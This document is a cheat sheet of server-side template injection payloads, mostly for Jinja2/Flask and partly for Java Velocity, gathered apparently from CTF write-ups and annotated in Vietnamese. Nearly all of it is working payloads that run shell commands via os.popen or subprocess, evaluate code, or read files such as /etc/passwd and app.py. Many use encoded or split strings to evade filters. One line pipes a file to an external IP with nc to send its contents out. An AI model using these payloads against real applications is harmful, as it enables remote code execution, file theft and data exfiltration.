https://saucer-man.com/information_security/516.html
https://blog.raw.pm/en/TMHC-CTF-2019-write-up/

bypass _ with attr
bypass [] with __getitem__
payload final : {{(''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat flag.txt').read()}}

{{"\u0022\u0022"|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")|attr("\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")(0)|attr("\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f")()|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")(137)|attr("\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f")|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")("\u0070\u006f\u0070\u0065\u006e")("cat flag")|attr("read")()}}

UNICODE
{{"\u0022\u0022"|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")|attr("\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")(0)|attr("\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f")()|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")(137)|attr("\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f")|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")("\u0070\u006f\u0070\u0065\u006e")("cat flag")|attr("read")()}}

UNICODE cho java
#set($x="#includ\u0065('/flag.txt')")
$x


SU DUNG PRINT

{%print(lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('id')|attr('read')())%}


Tao session moi

{%if session.update({'f':somepayload})%}{%endif%}

somepayload: cycler['__init__']['__globals__']['os']['popen']('id')['read']()

=> lipsum['__glo' 'bals__']['os']['popen']('tail /flag')['re' 'ad']()
{% set a=payload %}
{% set a=session.update({'f':somepayload}) %}
C2: somepayload: 
=> cycler['__in'+'it__']['__glob'+'als__']['os']['popen']('id')['re'+'ad']()

__class__.__init__.__globals__[app].config
{{url_for.__globals__['current_app'].config}}

{%if+session.update({request.args.se:request.application.__globals__.__builtins__.__import__(request.args.os).popen(request.args.cmd).read()})+%}{%endif%}&se=vinh&os=os&cmd=ls
{{''.__class__}}
{{''['__class__']}}
{{''|attr('__class__')}}

bypass _ with attr
bypass [] with __getitem__
Bypass . = |attr()
Bypass " ' = dict()|join

list(calc.__globals__)
{{''.__class__.mro()[1].__subclasses__()}}
{{().__class__.__base__.__subclasses__()}}

{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('ls')|attr('read')()}}  //os._wrap_close
{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")}} //warnings.catch_warnings
{{[].__class__.__base__.__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('ls /flasklight').read()")}} //warnings.catch_warnings
{{[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls').read()}} //site._Printer
{{[].__class__.__base__.__subclasses__()[127].__init__.__globals__['system']('cat /mnt/f1a9|nc 47.97.199.89 8888')}} //os._wrap_close
{[].__class__.__base__.__subclasses__()[189].__init__.__globals__['__builtins__']['__imp'+'ort__']('os').__dict__['pop'+'en']('ls').read()} //warnings.catch_warnings
{{''.__class__.__base__.__subclasses__()[131].__init__.__globals__['__builtins__']['ev'+'al']('__im'+'port__("o'+'s").po'+'pen("id")').read()}}
{{''.__class__.__base__.__subclasses__()[77].__init__.__globals__['sys'].modules['o'+'s'].__dict__['po'+'pen']('id').read()}}
{%if ""["__class__"]["__base__"]["__subclasses__"]()[65]["__init__"]["__globals__"]["__builtins__"]["__import__"]("os")["__dict__"]["popen"]("ls+/")["read"]()[0]=="a"%}vinh{%endif%}

{{config.__init__['__globals__'].os.popen('ls').read()}}
{{cycler.__init__.__globals__.__builtins__.__import__("os").popen("id").read()}}
{{cycler.__init__.__globals__.os.popen('ls').read()}}
{{((cycler|attr(dict(__ini=a,t__=a)|join)|attr(dict(__glob=a,als__=a)|join))[dict(o=a,s=a)|join]|attr(dict(po=a,pen=a)|join))(dict(l=a,s=a)|join)|attr(dict(re=a,ad=a)|join)()}}
{{cycler.__init__.__globals__.__builtins__.open("flag").read()}}
{{(cycler|attr(dict(__ini=a,t__=b)|join)|attr(dict(__glob=c,als__=d)|join))[dict(__buil=buil,tins__=tins)|join][dict(op=op,en=en)|join](dict(fl=fl,ag=ag)|join)|attr(dict(re=re,ad=ad)|join)()}}

{{x.__init__['__glob'+'als__']['__builtins__']['eval']('__import__("os").popen("ls").read()')}}
{{x.__init__.__globals__.__builtins__.open('app.py').read()}}
{{x.__init__.__globals__['__builtins__'].open('app.py').read()}}
{{x.__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls").read()')}}
{{x.__init__.__globals__.__builtins__['eval']('__import__("os").popen("ls").read()')}}
{{x.__init__.__globals__.__builtins__['ev'+'al']('__imp'+'ort__("o'+'s").po'+'pen("l'+'s").read()')}}

{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}

{{''.__class__.__base__.__subclasses__()[81].__init__.__globals__.__import__('os').popen('id').read()}} //_frozen_importlib._DummyModuleLock

{{()["__class__"]["__bases__"][0]["__subclasses__"]()[80]["load_model"]("os")["system"]("ls")}} //_frozen_importlib.BuiltinImporter

{{()["__class__"]["__bases__"][0]["__subclasses__"]()[91]["get_data"](0,"app.py")}} // _frozen_importlib_external.FileLoader
{%print('&girl_name=%s'|format(().__class__.__bases__[0].__subclasses__()[99].get_data(0, "/flag.txt")))%} //_frozen_importlib_external.FileLoader


{{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()[91]["get\x5fdata"](0,"/etc/passwd")}}

{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("ls *").read()}}
{{().__class__.__mro__[1].__subclasses__()[75].__init__.__globals__['__builtins__']['__impor'+'t__']('o'+'s')['po'+'pen']("ls").read()}}
{{"".__class__.__mro__[1].__subclasses__()}}
{{[].__class__.__mro__[1].__subclasses__()[127].__init__.__globals__['pop'+'en']('ls').read()}} //os._wrap_close
{{''.__class__.__mro__[2].__subclasses__()}}
{{''.__class__.__mro__[2].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()[0].strip()}}
{{''.__class__.__mro__[2].__subclasses__()[243]('ls',shell=True,stdout=-1).communicate()}}
{{''.__class__.__mro__[-1].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()[0].strip()}} //subprocess.Popen
{str([].__class__.__mro__[-1].__subclasses__()[220]('find /app | xargs grep flag',shell=True,stdout=-1).communicate()[0].strip())} //subprocess.Popen
{str([].__class__.__bases__[0].__subclasses__()[220]('ls',shell=True,stdout=-1).communicate()[0].strip())} //subprocess.Popen
{[].__class__.__mro__[-1].__subclasses__()[189].__init__.__globals__['__builtins__']['ev'+'al']('__imp'+'ort__("os").po'+'pen("ls").read()')} //warnings.catch_warnings

{{''[request.args.p1].mro()[1][request.args.p2]()[273](['ls'],stdout=-1).communicate()}}&p1=__class__&p2=__subclasses__ //subprocess.Popen
{{''[request.args.get('p1')].mro()[1][request.args.get('p2')]()[273]('ls', stdout=-1).communicate()[0].decode()}}&p1=__class__&p2=__subclasses__	


{{[]|attr('__class__')|attr('__mro__')|attr('__\x67etitem__')(1)|attr('__subclasses__')()|attr('__\x67etitem__')(132)|attr('__init__')|attr('__\x67lobals__')|attr('__\x67etitem__')('popen')('cat fla\x67')|attr('read')()}}


{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('ls')['read']()}}
{{request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("id")["read"]()}}

{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
{{config.__class__.__init__.__globals__['\x6f\x73'].__getattribute__('\x70\x6f\x70\x65\x6e')('ls /').read()}}

{{config["\x5f\x5fclass\x5f\x5f"]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["os"]["popen"]("ls")["read"]()}}
lipsum|attr('__globals__'))|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()


{{lipsum.__globals__.__builtins__.eval("__import__('os').popen('id').read()")}}

{{lipsum[(dict(__globals__=x)|list)[False]][(dict(os=x)|list)[False]][(dict(popen=x)|list)[False]]([(dict(cat=x)|list)[False]|center,(dict(galf=x)|list)[False]|reverse]|join)[(dict(daer=x)|list)[False]|reverse]()}}

{{url_for.__globals__.__builtins__.open("filename").read()}}
{{url_for.__globals__.__builtins__.open("flag.txt").read()}}
{{url_for.__globals__['__builtins__']['eval']("__import__('os')").open('').read()")}}

{{"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[%27popen%27](%27ls%27).read()}}
{{[].__class__.__bases__[0].__subclasses__()[40]('/').read()}} //file

{{''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/flag.txt').read()}}

{{
    request
    |attr('application')
    |attr('__globals__')
    |attr('__getitem__')('__builtins__')
    |attr('__getitem__')('__import__')('os')
    |attr('popen')('cat flag.txt')
}}
{{
	lipsum
	|attr('globals')
	|attr('getitem')('os')
	|attr('popen')('cat flag.txt')
	|attr('read')()
}}

filter ' and " ===> {{url_for.__globals__.os.__dict__}}

use LISTDIR() ===> {{url_for.__globals__.os.__dict__.listdir()}}

lưu ý là để sử dụng chr thì chúng ta phải gọi được built-in function chr ra trước:

{{% set chr=url_for.__globals__.__builtins__.chr %}}

final payload: {{% set chr=url_for.__globals__.__builtins__.chr %}}
{{url_for.__globals__.__builtins__.open((chr(102),chr(108),chr(97),chr(103),chr(46),chr(116),chr(120),chr(116))|join).read())}}

filter builtins

liệt kê ra tất cả các method và dễ dàng tìm chính xác vị trí của request	
{% for i in url_for.__globals__ %}{{i}}{% endfor %}

Ví dụ vị trí của method là 7 thì mình sẽ sử dụng:

{%  set req=url_for.__globals__.pop((url_for.__globals__|list).__getitem__(7)) %}

getitem được sử dụng cho list nên đó là lí do mình chuyển url_for.__globals__ thành list.

final payload:{%set req=url_for.__globals__.pop((url_for.__globals__|list).__getitem__(7)) %}{{url_for.__globals__.os.__dict__.popen(req.args.command).read()}}&command='cat /abc/flag.txt'

filter bal:

{{url_for["__globa""ls__"].__builtins__.open("flag.txt").read()}}

{{''.__class__.mro()[1].__subclasses__[360].(['cat', 'f*.txt'], stdout=-1).communicate()}}
{{"".__class__.__mro__[1].__subclasses__()[414]('ls',shell=True,stdout=-1).communicate()}}
{{"".__class__.__mro__[1].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()}}
{{"".__class__.__mro__[1].__subclasses__()[414](["cat flat.txt"],shell=True,stdout=-1).communicate()}}
{{''.__class__.__mro__[1].__subclasses__()[414]('ls',shell=True,stdout=-1).communicate()[0]}} 
{{''.__class__.__mro__[2].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()[0].strip()}}
{{[].__class__.__bases__[0].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()[0].strip()}}
{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(360)('ls',stdout=-1)|attr('communicate')()}}

filter os,_,base

{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fim'+'port\x5f\x5f')('o'+'s')|attr('popen')('cat flag.txt')|attr('read')()}}

submit?value={{request[request.args.param][request.args.p][-1][request.args.subclasses]()[40](%22flag.txt%22).read()%20}}&param=__class__&p=__mro__&dict=__dict__&subclasses=__subclasses__

filter: - _ ,config ,os, RUNCMD, base
{{lipsum.__globals__.__builtins__.eval("__import__('os').popen('whoami').read()")}}
{{lipsum|attr('globals')|attr('getitem')('os')|attr('popen')('cat flag.txt')|attr('read')()}}

{{request['application']['\\x5f\\x5fglobals\\x5f\\x5f']['\\x5f\\x5fbuiltins\\x5f\\x5f']['open']('flag.txt')['read']()}}

{{''[request.args.a][request.args.b][2][request.args.c]()[258]('cat+flag.txt',shell%3dTrue,stdout%3d-1).communicate()[0].strip()}}&a=__class__&b=__mro__&c=__subclasses__

{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f']('\x6f\x73')['\x70\x6f\x70\x65\x6e']('ls')['read']()}}

{% for c in [].__class__.__base__.__subclasses__() %}
	{%if c.__name__=='catch_warnings' %}
		{{c.__init__.__globals__['__builtins__']['__import__']('os').listdir('/')}}
	{% endif %}
{% endfor %}

{% for c in [].__class__.__base__.__subclasses__() %}
	{%if c.__name__=='catch_warnings' %}
		{{ c.__init__.__globals__['__builtins__'].open('/flag','r').read()}}
	{% endif %}
{% endfor %}

{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
	{% for b in c.__init__.__globals__.values() %}
	{% if b.__class__ == {}.__class__ %}
		{% if 'eval' in b.keys() %}
			{{b['eval']('__import__("os").popen("ls").read()')}}
		{% endif %}
	{% endif %}
	{% endfor %}
{% endif %}
{% endfor %}

{% set chr=""["__class__"]["__base__"]["__subclasses__"]()[65]["__init__"]["__globals__"]["__builtins__"]["chr"] %}{% if "" ["__class__"]["__base__"]["__subclasses__"]()[65]["__init__"]["__globals__"]["__builtins__"]["eval"]("__import__(chr(111)+chr(115))")[chr(112)+chr(111)+chr(112)+chr(101)+chr(110)](chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(99)+chr(42))["read"]()[0]=="a"%}ca01h{%endif%}


{% for c in [].__class__.__base__.__subclasses__() %}
	{% if c.__name__=='catch_warnings' %}
		{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")}}
	{% endif %}
	{% endfor %}

{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }}{% endif %}{% endfor %}

{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")}}{% endif %}{% endfor %}

{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}{% endif %}{% endfor %}

JAVA VELOCITY

#set($x="#includ")
#set($y="e('/etc/passwd')")
#set($c="$x$y")
#evaluate($c)

